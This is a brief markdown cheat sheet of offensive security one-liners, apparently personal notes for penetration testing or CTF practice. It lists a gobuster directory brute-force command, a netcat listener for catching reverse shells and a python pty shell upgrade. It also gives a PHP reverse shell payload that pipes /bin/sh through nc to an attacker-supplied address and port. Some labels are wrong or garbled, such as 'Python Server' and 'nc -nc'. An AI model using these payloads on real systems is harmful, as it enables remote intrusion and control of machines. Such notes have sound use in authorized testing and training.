# Useful Codes
---
## nMap
---



---
## Gobuster
---
- Gobuster Dir

```bash
gobuster dir -u http://$IP --wordlist $Wordlist
```
---
## Hydra
---



---
## Netcat
---
- Listening for incoming RevShells
```sh
nc -lvnp port
```
- Listen for incoming calls
```sh
nc -nc ip port
```

---
## Python
---
- Python Server
```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---
## Revshells
---
- PHP Reverse Shell
```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"); ?>
```

---
## XML Prettyfy
---
```bash
xsltproc all.xml -o all.html (nmap xml to html)
```